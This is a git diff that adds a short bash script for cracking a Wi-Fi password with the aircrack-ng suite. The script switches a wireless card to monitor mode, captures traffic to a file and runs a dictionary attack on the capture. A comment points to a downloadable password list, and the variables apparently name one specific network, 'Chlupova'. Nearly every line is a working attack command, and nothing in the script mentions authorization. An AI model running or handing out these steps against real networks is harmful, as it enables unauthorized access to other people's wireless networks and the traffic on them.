@@ -1,0 +1,27 @@
+#!/bin/bash
+
+# - dictionaries with passwords can be downloaded:
+## git clone git@github.com:josuamarcelc/common-password-list.git
+
+# - First check your wifi card
+ifconfig   # In my case wlan card is: wlp3s0
+
+# - VARIABLES: Laptop+Chlupova
+wlan=wlp3s0
+label=airodump-chlupova # initial file name for dumping
+dict=
+
+# - Set in into monitor mode
+sudo airmon-ng start ${wlan}
+ # sudo airmon-ng stop ${wlan}mon   : for stop
+
+# - Monitoring
+sudo airodump-ng -w ${label} ${wlan}mon
+
+ # NOTE:
+ # -c CHANNEL --bssid SSID
+ # choose exact channel or SSID to snif
+
+# - Cracking
+aircrack-ng -w ${dict} ${label}-01.cap
+
